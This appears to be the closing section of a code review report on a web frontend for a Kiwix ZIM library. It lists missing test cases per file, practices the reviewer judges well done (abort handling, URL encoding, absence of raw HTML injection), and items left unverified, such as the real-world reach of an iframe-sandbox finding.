- **`Charts.tsx`:** `Sparkline` with 0/1 point, all zeros, NaN, explicit `max`; `Bars` zero/partial columns; `seconds()` boundaries (`<1`, 89, 90, 5400, 172800).
- **`lib/format.ts`:** `bytes(0/0.5/NaN/Infinity)`, `ago(null/future/epoch)`, `day()` under a fixed TZ, `duration`, `language("")`/invalid codes, `categoryCounts` "other" ordering.
- **`lib/speech.ts`:** `speakable` on tables/citations/code, `chunks()` with no punctuation, a single sentence longer than `size`, cancel mid-utterance, provider prefetch abort/object-URL cleanup.
- **`lib/tidy.ts`:** tests are good but miss escaped pipes in tables, streaming unclosed inline code, nested fences, CRLF, and source-list removal variants.
- **`Filing.tsx`:** `saveIcon` FormData vs DELETE, `ownIcon`/`bookIconOf` truthiness, category rename callback casing.
- **Pagination/queue math:** `Feeds` article paging (F4), `Search` `start` parsing (F21), queue `concurrency` adopt-on-failure (F5), `Catalog` download-state invalidation (F16).
- **Forms/validation:** `Settings.number()`, `IntervalInput` unit conversion, `RateInput` decimals/exponents, link `max_depth`/`max_pages`, upload size/type, double-submit guards (F15).
- **Markdown/XSS:** `linkCitations` over code (F6), react-markdown URL transform, Reader iframe sandbox (F1), `dangerouslySetInnerHTML` absence (currently none).

## What is done well

- `tidyMarkdown` is genuinely well factored (fenced segments protected, streaming-aware repairs) and has the only tests — and they pass.
- `Ask` streaming is the best-handled async path: `AbortController`, `run` generation counter, `patchLast` guarded by `mine === run.current`, Stop button, and unmount abort.
- `Network.turn` is optimistic with a server re-read and error rollback; secret masks (`••••••••`) are handled end-to-end. Destructive actions use `window.confirm` with specific text ("The N ZIMs filed under it go back to My ZIMs").
- URL building is consistently encoded (`contentUrl`/`readUrl`/`markdownUrl`, `encodeURIComponent` for ids and category names), and `URLSearchParams` is used for catalog/search/log queries.
- No `dangerouslySetInnerHTML` anywhere; react-markdown is used without `rehype-raw`, so model/user HTML is not injected. The mobile/keyboard viewport handling and `prefers-reduced-motion` CSS are thoughtful.
- Upload progress uses XHR deliberately; the feed "hold" flag defers the first sync until the icon is stored.

## Unverified / out of scope

- Real EventSource reconnect/backoff behaviour behind proxies, and whether `/api/events` is intentionally public (backend change required). iOS visual-viewport panning and the `kb:` variants were reviewed statically, not on a device.
- The actual trust level of Kiwix catalog ZIMs vs user uploads for F1; the attack is only as strong as the ability to get a malicious ZIM into `/content`.
- Speech provider audio formats/autoplay policies; `playSample` and `speak` assume the browser can decode the returned blob. `web/dist`, the production static-file mount, and base-path deployment were not exercised.
- Backend performance of `/api/updates` (fetched by the shell on every revision) was not measured; on large libraries the badge fetch may be costly.
